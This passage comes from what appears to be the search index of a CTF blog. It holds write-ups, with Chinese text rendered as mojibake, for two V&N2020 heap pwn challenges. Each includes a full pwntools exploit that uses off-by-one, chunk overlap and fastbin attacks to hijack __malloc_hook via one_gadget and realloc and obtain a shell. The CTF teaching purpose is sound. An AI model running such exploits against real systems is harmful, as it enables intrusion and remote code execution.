tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: æ³„æ¼libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #è§¦å‘one_gadget p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 å…¬å¼€èµ›]simpleHeap","content":"é€šè¿‡è¿™ä¸ªé¢˜ç›®æ¥å­¦ä¹  off-by-one ä»€ä¹ˆæ˜¯off by one(null) ? å®šä¹‰æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œç›´æ¥è¯´æˆ‘çš„ç†è§£ã€‚å°±æ˜¯é‚£ç§åœ¨ç”¨æˆ·è¾“å…¥æ—¶ï¼Œä¸€ä¸ªå¾ªç¯å¤„ç†è¾¹ç•Œé—®é¢˜æˆ–è€…æ˜¯æ•°ç»„è¶Šç•Œï¼Œå¯¹æˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¾ˆå¥½çš„å¤„ç†ï¼Œå°±ä¼šå¯¼è‡´ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼ˆæˆ–è€…æ˜¯strcpyå¤„ç†ä¸å½“ï¼‰ã€‚ åˆ©ç”¨off-by-one æœ‰å¸ˆå‚…å–œæ¬¢å«off-by-one ä¸ºä¸€ä¸ªå­—èŠ‚çš„å·æ¸¡æ”»å‡» ç»™æ”»å‡»è€…å‘æŒ¥çš„æ”»å‡»ç©ºé—´ä¹Ÿåªæœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼è¿˜æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ æˆ‘ä»¬æœ€å¸¸åˆ©ç”¨çš„ï¼ˆæˆ–è®¸æ˜¯ï¼‰æ‰‹æ³•æ˜¯ å †å—é‡å ï¼ˆchunk extendï¼‰ï¼Œè·Ÿæˆ‘ä¹‹å‰è®²è¿‡çš„â€œå †å—æ€€å­•â€æœ¬è´¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œchunk extend çš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š 1ï¼Œèƒ½å¤Ÿè¿›è¡Œå †ç©ºé—´çš„å¸ƒå±€ï¼ˆå³å†™å…¥ä¹‹ç±»çš„åŠŸèƒ½ï¼‰ 2ï¼Œè‡³å°‘èƒ½å¤Ÿæº¢å‡ºä¸€ä¸ªå­—èŠ‚ å…¶ä¸­ç¬¬äºŒä¸ªæ¡ä»¶æ­£å¥½ç¬¦åˆoff-by-oneçš„æƒ…æ™¯ åˆ©ç”¨è¿‡ç¨‹ï¼šoff-by-one + chunk extend ç”±äºæœ¬äººæ°´å¹³æœ‰é™ï¼ˆwtcl orz æ‰€ä»¥å°±ä¸¾ä¸¤ä¸ªä¾‹å­å¥½äº†ï¼Œä¸€ä¸ªæ˜¯å¼€å¯äº†Full RELROï¼Œä¸€ä¸ªæ²¡å¼€å¯ gotè¡¨æ— é˜²æŠ¤çš„åˆ©ç”¨æƒ…æ™¯ æ—¢ç„¶gotè¡¨æ— é˜²æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºæ¥æ”¹å†™gotè¡¨ï¼Œçœ‹è¯¦ç»†çš„cä»£ç ï¼š #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } æ€è·¯æ˜¯ç”³è¯·ä¸‰ä¸ªchunkï¼Œå¤§å°åˆ†åˆ«ä¸º0x18,0x20,0x30 ç¬¬ä¸€ä¸ªchunkç”¨æ¥å‡ºå‘off-by-one æ¼æ´ï¼Œç¬¬äºŒä¸ªchunkç”¨æ¥æ„ç­‘å †å—é‡å ï¼Œç¬¬ä¸‰ä¸ªchunkç”¨æ¥æ„ç­‘ fake chunkï¼Œæˆ‘ä»¬åˆ©ç”¨ç¬¬ä¸€ä¸ªchunkæº¢å‡ºä¸€å­—èŠ‚æ¥æ”¹å†™ç¬¬äºŒä¸ªchunkçš„sizeä½ï¼Œç„¶åå°†ç¬¬ä¸‰ä¸ªchunkæ¥åŒ…å«è¿›å»ï¼Œç„¶åfreeä¸¤æ¬¡ï¼Œåœ¨mallocä¸€æ¬¡ï¼Œæ‹¿åˆ°big chunkçš„æ§åˆ¶æƒï¼Œé€šè¿‡å‘big chunké‡Œå†™å…¥å†…å®¹ï¼Œæ”¹å†™free small chunkçš„fd pointer(æ­¤æ—¶smaller chunkè¿˜æ˜¯freeæ€)ï¼Œæ¥ç€mallocä¸¤æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ‹¿åˆ°ä¸€ä¸ªfake chunkï¼Œå¦‚æœfake chunkä½äºgotè¡¨é™„è¿‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åŠ«æŒgotè¡¨é¡¹ç»§è€Œæ‹¿åˆ°shell æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å…·ä½“çš„è°ƒè¯•è¿‡ç¨‹ã€‚ mallocæ‹¿åˆ°ä¸‰ä¸ªå †å—ï¼š äººä¸ºæ„é€ ä¸€ä¸ªoff-by-oneæ¥æº¢å‡ºä¸€å­—èŠ‚ï¼š freeä¸¤æ¬¡ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ”¹å†™åçš„chunkå·²ç»å˜æˆäº†freeæ€ï¼š é€šè¿‡å‘big chunké‡Œå†™å†…å®¹å¯ä»¥æ”¹å†™fd pointerï¼Œå¯ä»¥çœ‹åˆ°2å·chunkçš„pointerå·²ç»å˜æˆäº†â€˜AAAAâ€™â€¦â€¦ è¿™ä¸ªä¾¿æ˜¯åŠ«æŒgotè¡¨çš„æµç¨‹ got è¡¨ä¸å¯å†™ï¼š å¯¹äºgotè¡¨é¡¹ä¸å¯å†™çš„elfï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿé‰´fastbin attackçš„æ€è·¯æ¥æ”»å‡»__malloc_hookå‡½æ•°ï¼Œå°†__malloc_hookå‡½æ•°æ”¹å†™æˆone_gadgetï¼Œè§¦å‘mallocæ‹¿shell æ€è·¯å¾ˆç®€å•ï¼Œå¤§ä½“æ€è·¯å’Œä¸Šé¢ä¸€æ ·ï¼Œç„¶åä¸‰å·chunkçš„fd pointerå¯ä»¥å†™æˆ__malloc_hook+23çš„ä½ç½®ï¼ˆå­—èŠ‚é”™ä½ï¼Œå…·ä½“åŸå› ä¸å†èµ˜è¿°ï¼‰ï¼Œç„¶åå°†__malloc_hookæ”¹å†™å³å¯ï¼Œæ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†è¾¾åˆ°fastbin attackçš„ç›®çš„ï¼Œæˆ‘ä»¬3å·å—çš„memå¤§å°å¿…é¡»æ˜¯0x60ï¼Œå› ä¸ºè¦æŠŠ0x7fçš„fake chunké“¾æ¥åœ¨åŒä¸€ä¸ªbinä¸­ é¢˜ç›®è§£æï¼š é€†å‘è¿‡ç¨‹ï¼š ä»£ç é‡å°šå¯ï¼Œoff-by-oneçš„æ¼æ´è¿˜æ˜¯æœ‰ä¸€å®šéšç§˜æ€§çš„ï¼Œå…·ä½“çš„é€†å‘åˆ†æä¸å†èµ˜è¿° æ³¨æ„ä¸¤ä¸ªç‚¹å³å¯ï¼š ç¬¬ä¸€ï¼Œæœ¬ç¨‹åºä¸å­˜åœ¨UAFæ¼æ´ï¼Œå³deleteå‡½æ•°ä¸­å¯¹freeçš„chunkå¤„ç†çš„å¾ˆå¥½ï¼ŒæŠŠfreeæ€çš„æŒ‡é’ˆæ•°æ®éƒ½ç»™æ¸…ç©ºäº† ç¬¬äºŒï¼Œå°±æ˜¯off-by-oneçš„äº§ç”Ÿçš„ä½ç½® å¯ä»¥çœ‹åˆ°ï¼Œifåˆ¤æ–­è¯­å¥æ˜¯å°äºå·ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å˜é‡ç­‰äºsize+1çš„æ—¶å€™ä¾ç„¶å¯ä»¥å¯ä»¥è¯»å…¥æ•°æ®ï¼Œè¿™å°±æ˜¯å…¸å‹çš„off-by-oneæ¼æ´ pwn it ï¼ï¼ï¼ æ€è·¯åˆ†æ è¿™ä¸ªç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æ”»å‡»gotè¡¨äº†ï¼Œæˆ‘ä»¬åªèƒ½é€‰æ‹©__malloc_hookå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æƒ³æ‰¾åˆ°__malloc_hookå‡½æ•°ï¼Œæˆ‘ä»¬å¿…é¡»æ³„æ¼libcï¼Œä½†æ˜¯ç¨‹åºåªå…è®¸æˆ‘ä»¬ç”³è¯·fastbinå¤§å°çš„chunk è¿™ä¸ªé¢˜æœ‰ä¸€ä¸ªå¾ˆå·§å¦™çš„æ³„æ¼libcçš„æ–¹æ³•ï¼Œå°±æ˜¯å°†ä¸¤ä¸ªfastbinåˆå¹¶æˆä¸€ä¸ªunsortedbinï¼Œåˆ©ç”¨unsorted binæ¥æ³„æ¼main_arena + 88çš„ä½ç½®ï¼Œç„¶åæ‹¿åˆ°libcåŸºå€ã€‚ å…·ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œæ„é€ å››ä¸ªchunkï¼š chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 ï¼ˆé˜²æ­¢ä¸top chunkåˆå¹¶ï¼‰ æˆ‘ä»¬é€šè¿‡off-by-oneå°†1å’Œ2åˆå¹¶ï¼Œfree 1ï¼Œè¿™ä¸ªæ—¶å€™1å’Œ2åˆå¹¶çš„chunkå·²ç»è¶…è¿‡fastbinï¼Œè¿›å…¥unsorted binï¼Œæˆ‘ä»¬å†malloc(0x50)ï¼Œè¿™ä¸ªæ—¶å€™unsorted binå°±ä¼šåˆ‡å‰²ä¸‹æ¥0x50ï¼Œå‰©ä¸‹2å·chunkç•™åœ¨unsorted biné‡Œé¢ï¼Œä½†æ˜¯ï¼ï¼æˆ‘ä»¬ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰free chunk 2ï¼Œ2å·æŒ‡é’ˆçš„æ§åˆ¶æƒä»ç„¶åœ¨æˆ‘ä»¬æ‰‹ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰“å°2å·chunkçš„å†…å®¹ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸º2å·chunkåœ¨unsorted biné‡Œï¼Œå…¶fd å’Œ bkéƒ½æ˜¯æœ‰å†…å®¹çš„ï¼ï¼ä»–ä»¬éƒ½æŒ‡å‘äº†main_arena + 88ï¼Œé€šè¿‡è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±èƒ½æ³„æ¼å‡ºlibcçš„åŸºåœ°å€ æˆ‘ä»¬æ‹¿åˆ°åŸºå€åï¼Œå°±å¾—æƒ³åŠæ³•fastbin attackï¼Œæœ‰ä¸€ç§åŠæ³•å°±æ˜¯æˆ‘ä»¬ä¸Šæ–‡è¯´çš„æ–¹æ³•ï¼Œæ„é€ ä¸‰ä¸ªfastbin chunkï¼Œè‡ªç„¶æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®é™åˆ¶æˆ‘ä»¬mallocæ¬¡æ•°ï¼Œæˆ‘ä»¬è¿˜æœ‰åŠæ³•å—ï¼Ÿï¼ˆè¿™ä¸ªé¢˜ç›®è™½ç„¶é™åˆ¶æ¬¡æ•°ï¼Œä½†æ˜¯ä¾ç„¶ç”³è¯·ä¸‰æ¬¡ä¾ç„¶åœ¨å…è®¸çš„èŒƒå›´ä¹‹å†…ï¼‰ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥malloc(0x60)ï¼Œè®°æˆchunk 4ï¼Œç„¶åæˆ‘ä»¬ç´§æ¥ç€free 4ï¼Œè¿™ä¹ˆåšçš„ç›®çš„å°±æ˜¯å°†è¿™å—chunkä»unsorted binä¸­ç§»åŠ¨åˆ° fastbinä¸­ï¼Œso æˆ‘ä»¬å†æ¬¡åˆ©ç”¨ allocated æ€çš„2å·pointeræ¥editï¼ŒæŠŠfdä½æ”¹æˆ__malloc_hook - 0x23ï¼Œç„¶åone_gadget ä½†æ˜¯è¿™ä¸ªé¢˜ç›®åœ¨gadgetçš„æ—¶å€™æˆ‘ä»¬å‘ç°æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºå››ä¸ªgadgetçš„å¯„å­˜å™¨çš„æ¡ä»¶æˆ‘ä»¬å‡ä¸æ»¡è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å€ŸåŠ©__libc_reallocå‡½æ•°æ¥è°ƒæ•´å¯„å­˜å™¨çš„å€¼ï¼Œåœ¨__libc_reallocå‡½æ•°ä¸­ä¼šè°ƒç”¨__realloc_hookå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠone_gadgetçš„ä½ç½®æ‰“åˆ°__realloc_hookçš„ä½ç½®ï¼ŒæŠŠ__libc_reallocçš„åœ°å€æ‰“åˆ°__malloc_hooké‡Œé¢å³å¯ï¼Œä»¤äººå…´å¥‹çš„æ˜¯ï¼Œ__realloc_hookçš„ä½ç½®å°±åœ¨__malloc_hookçš„ä¸Šæ–¹ï¼Œè¿™æ ·æˆ‘ä»¬çš„ç¨‹åºæ‰§è¡Œæµç¨‹ä¸ºï¼Œæˆ‘ä»¬malloc---&gt;è§¦å‘__malloc_hook---&gt;è·³è½¬åˆ°__libc_reallocè°ƒæ•´å¯„å­˜å™¨---&gt;è§¦å‘__realloc_hook---&gt;__realloc_hookæ˜¯æˆ‘ä»¬çš„one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 æ¼æ´åˆ©ç”¨ exp:ï¼ˆpwntoolsç‰ˆæœ¬æ˜¯python3çš„ç‰ˆæœ¬ï¼‰ from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}